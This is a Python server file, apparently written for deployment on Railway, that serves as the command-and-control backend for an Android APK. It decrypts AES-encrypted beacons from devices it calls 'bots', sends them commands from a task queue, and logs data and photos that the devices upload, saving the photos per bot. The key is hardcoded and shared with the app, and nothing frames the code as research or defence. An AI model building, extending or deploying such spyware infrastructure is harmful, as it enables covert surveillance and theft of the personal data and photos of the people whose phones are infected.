# language: Python 3.11, file: server.py, target: Railway ($5 plan), deps: pycryptodome
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from base64 import b64decode, b64encode
from pathlib import Path
from datetime import datetime, timezone
import json, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b"MySecretKey12345678901234567890a"          # APK wali hi 32-byte key
ROOT = Path(os.environ.get("DATA_DIR", "/data"))   # Railway Volume yahan mount karo
MEDIA = ROOT / "media"
MEDIA.mkdir(parents=True, exist_ok=True)
DATA_LOG = ROOT / "data.jsonl"
TASK_QUEUE = ROOT / "tasks.jsonl"


def enc(obj: dict) -> str:
    iv = os.urandom(16)
    ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(json.dumps(obj).encode(), 16))
    return b64encode(iv + ct).decode()


def dec(raw: str) -> dict:
    blob = b64decode(raw)
    return json.loads(
        unpad(AES.new(KEY, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]), 16).decode()
    )


def next_task() -> dict:
    if not TASK_QUEUE.exists():
        return {"cmd": "noop"}
    lines = TASK_QUEUE.read_text().splitlines()
    if not lines:
        return {"cmd": "noop"}
    task = json.loads(lines[0])
    rest = lines[1:]
    TASK_QUEUE.write_text("\n".join(rest) + ("\n" if rest else ""))
    return task


def save_media(bot: str, arr: list) -> int:
    target = MEDIA / bot
    target.mkdir(parents=True, exist_ok=True)
    saved = 0
    for item in arr:
        b64 = item.get("b64")
        if not b64:
            continue
        name = f"{item.get('ts', 0)}_{item.get('name', f'{saved}.jpg')}".replace("/", "_")
        (target / name).write_bytes(b64decode(b64))
        saved += 1
    return saved


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *_):
        pass

    def _reply(self, body: bytes, ctype: str, code: int = 200):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        try:
            body = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode()
            msg = dec(body)
        except Exception:
            self._reply(b"{}", "application/json", 400)
            return

        now = datetime.now(timezone.utc).isoformat()

        if self.path.endswith("/api/tasks"):
            with DATA_LOG.open("a") as f:
                f.write(json.dumps({
                    "ts": now, "kind": "beacon",
                    "id": msg.get("id"), "info": msg.get("info")
                }) + "\n")
            self._reply(enc(next_task()).encode(), "application/octet-stream")
            return

        if self.path.endswith("/api/data"):
            typ = msg.get("type", "unknown")
            data = msg.get("data", "")
            extra = {}
            if typ == "media":
                try:
                    extra["photos_saved"] = save_media(
                        msg.get("id", "unknown"),
                        json.loads(data) if isinstance(data, str) else data
                    )
                except Exception as e:
                    extra["media_error"] = str(e)
            with DATA_LOG.open("a") as f:
                f.write(json.dumps({
                    "ts": now, "kind": typ, "id": msg.get("id"),
                    "data": data, **extra
                }) + "\n")
            self._reply(b"{}", "application/json")
            return

        with DATA_LOG.open("a") as f:
            f.write(json.dumps({
                "ts": now, "kind": "raw", "path": self.path, "data": msg
            }) + "\n")
        self._reply(b"{}", "application/json")

    def do_GET(self):
        if self.path == "/health":
            self._reply(b"ok", "text/plain")
        else:
            self._reply(b"{}", "application/json")


if __name__ == "__main__":
    ThreadingHTTPServer(
        ("0.0.0.0", int(os.environ.get("PORT", 8080))), Handler
    ).serve_forever()
